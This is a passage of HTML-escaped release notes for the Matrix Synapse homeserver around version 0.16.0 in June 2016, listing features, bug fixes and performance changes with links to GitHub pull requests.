 	&lt;li&gt;Fix bug where rooms where marked as published by default (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;857&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;857&quot; data-id=&quot;159171952&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#857&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix bug where joining room with an event with invalid sender (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;868&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;868&quot; data-id=&quot;160169477&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#868&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix bug where backfilled events were sent down sync streams (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;869&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;869&quot; data-id=&quot;160383501&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#869&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix bug where outgoing connections could wedge indefinitely, causing push notifications to be unreliable (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;870&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;870&quot; data-id=&quot;160388703&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#870&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Performance improvements:
&lt;ul&gt;
 	&lt;li&gt;Improve &lt;code&gt;&#x2F;publicRooms&lt;&#x2F;code&gt; performance (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;859&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;859&quot; data-id=&quot;159188459&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#859&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;changes-in-synapse-v0-16-0-2016-06-09&quot;&gt;Changes in synapse v0.16.0 (2016-06-09)&lt;&#x2F;h3&gt;
&lt;p&gt;NB: As of v0.14 all AS config files must have an ID field.&lt;&#x2F;p&gt;
&lt;p&gt;Bug fixes:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Don&#x27;t make rooms published by default (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;857&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;857&quot; data-id=&quot;159171952&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#857&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;changes-in-synapse-v0-16-0-rc2-2016-06-08&quot;&gt;Changes in synapse v0.16.0-rc2 (2016-06-08)&lt;&#x2F;h3&gt;
&lt;p&gt;Features:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Add configuration option for tuning GC via &lt;code&gt;gc.set_threshold&lt;&#x2F;code&gt; (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;849&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;849&quot; data-id=&quot;158942313&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#849&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Changes:
&lt;ul&gt;
 	&lt;li&gt;Record metrics about GC (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;771&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;771&quot; data-id=&quot;153734745&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#771&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;847&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;847&quot; data-id=&quot;158911645&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#847&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;852&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;852&quot; data-id=&quot;158961878&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#852&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add metric counter for number of persisted events (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;841&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;841&quot; data-id=&quot;158673436&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#841&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Bug fixes:
&lt;ul&gt;
 	&lt;li&gt;Fix &#x27;From&#x27; header in email notifications (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;843&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;843&quot; data-id=&quot;158692541&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#843&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix presence where timeouts were not being fired for the first 8h after restarts (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;842&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;842&quot; data-id=&quot;158689045&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#842&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix bug where synapse sent malformed transactions to AS&#x27;s when retrying transactions (Commits&lt;a class=&quot;commit-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;commit&#x2F;310197bab5cf8ed2c26fae522f15f092dbcdff58&quot;&gt;&lt;tt&gt;310197b&lt;&#x2F;tt&gt;&lt;&#x2F;a&gt;, &lt;a class=&quot;commit-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;commit&#x2F;84379062f9ec259abc302af321d4ed8f5a958c01&quot;&gt;&lt;tt&gt;8437906&lt;&#x2F;tt&gt;&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Performance Improvements:
&lt;ul&gt;
 	&lt;li&gt;Remove event fetching from DB threads (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;835&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;835&quot; data-id=&quot;158404359&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#835&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Change the way we cache events (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;836&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;836&quot; data-id=&quot;158410030&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#836&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add events to cache when we persist them (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;840&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;840&quot; data-id=&quot;158647785&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#840&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;changes-in-synapse-v0-16-0-rc1-2016-06-03&quot;&gt;Changes in synapse v0.16.0-rc1 (2016-06-03)&lt;&#x2F;h3&gt;
&lt;p&gt;Version 0.15 was not released. See v0.15.0-rc1 below for additional changes.&lt;&#x2F;p&gt;
&lt;p&gt;Features:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Add email notifications for missed messages (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;759&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;759&quot; data-id=&quot;151860508&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#759&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;786&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;786&quot; data-id=&quot;155084975&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#786&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;799&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;799&quot; data-id=&quot;156336186&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#799&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;810&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;810&quot; data-id=&quot;157876958&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#810&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;815&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;815&quot; data-id=&quot;158088266&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#815&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;821&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;821&quot; data-id=&quot;158184002&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#821&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add a &lt;code&gt;url_preview_ip_range_whitelist&lt;&#x2F;code&gt; config param (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;760&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;760&quot; data-id=&quot;152195317&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#760&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add &#x2F;report endpoint (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;762&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;762&quot; data-id=&quot;152983097&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#762&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add basic ignore user API (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;763&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;763&quot; data-id=&quot;153078662&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#763&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add an openidish mechanism for proving that you own a given user_id (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;765&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;765&quot; data-id=&quot;153225023&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#765&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Allow clients to specify a server_name to avoid &#x27;No known servers&#x27; (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;794&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;794&quot; data-id=&quot;155729287&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#794&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add secondary_directory_servers option to fetch room list from other servers (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;808&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;808&quot; data-id=&quot;157727869&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#808&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;813&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;813&quot; data-id=&quot;157957443&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#813&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Changes:
&lt;ul&gt;
 	&lt;li&gt;Report per request metrics for all of the things using request_handler (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;756&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;756&quot; data-id=&quot;151597373&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#756&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Correctly handle &lt;code&gt;NULL&lt;&#x2F;code&gt; password hashes from the database (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;775&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;775&quot; data-id=&quot;154218069&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#775&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Allow receipts for events we haven&#x27;t seen in the db (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;784&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;784&quot; data-id=&quot;154729615&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#784&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Make synctl read a cache factor from config file (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;785&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;785&quot; data-id=&quot;155061473&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#785&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Increment badge count per missed convo, not per msg (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;793&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;793&quot; data-id=&quot;155472279&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#793&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Special case m.room.third_party_invite event auth to match invites (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;814&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;814&quot; data-id=&quot;158008655&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#814&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Bug fixes:
&lt;ul&gt;
 	&lt;li&gt;Fix typo in event_auth servlet path (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;757&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;757&quot; data-id=&quot;151841944&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#757&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix password reset (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;758&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;758&quot; data-id=&quot;151842844&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#758&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Performance improvements:
&lt;ul&gt;
 	&lt;li&gt;Reduce database inserts when sending transactions (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;767&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;767&quot; data-id=&quot;153422719&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#767&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Queue events by room for persistence (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;768&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;768&quot; data-id=&quot;153453122&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#768&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add cache to &lt;code&gt;get_user_by_id&lt;&#x2F;code&gt; (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;772&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;772&quot; data-id=&quot;153734759&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#772&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add and use &lt;code&gt;get_domain_from_id&lt;&#x2F;code&gt; (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;773&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;773&quot; data-id=&quot;153737866&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#773&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Use tree cache for &lt;code&gt;get_linearized_receipts_for_room&lt;&#x2F;code&gt; (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;779&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;779&quot; data-id=&quot;154683780&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#779&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Remove unused indices (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;782&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;782&quot; data-id=&quot;154703597&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#782&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add caches to &lt;code&gt;bulk_get_push_rules*&lt;&#x2F;code&gt; (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;804&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;804&quot; data-id=&quot;157677823&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#804&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Cache &lt;code&gt;get_event_reference_hashes&lt;&#x2F;code&gt; (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;806&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;806&quot; data-id=&quot;157702778&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#806&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add &lt;code&gt;get_users_with_read_receipts_in_room&lt;&#x2F;code&gt; cache (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;809&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;809&quot; data-id=&quot;157867129&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#809&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Use state to calculate &lt;code&gt;get_users_in_room&lt;&#x2F;code&gt; (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;811&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;811&quot; data-id=&quot;157921429&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#811&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Load push rules in storage layer so that they get cached (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;825&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;825&quot; data-id=&quot;158334922&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#825&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Make &lt;code&gt;get_joined_hosts_for_room&lt;&#x2F;code&gt; use get_users_in_room (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;828&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;828&quot; data-id=&quot;158336691&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#828&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Poke notifier on next reactor tick (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;829&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;829&quot; data-id=&quot;158337243&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#829&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
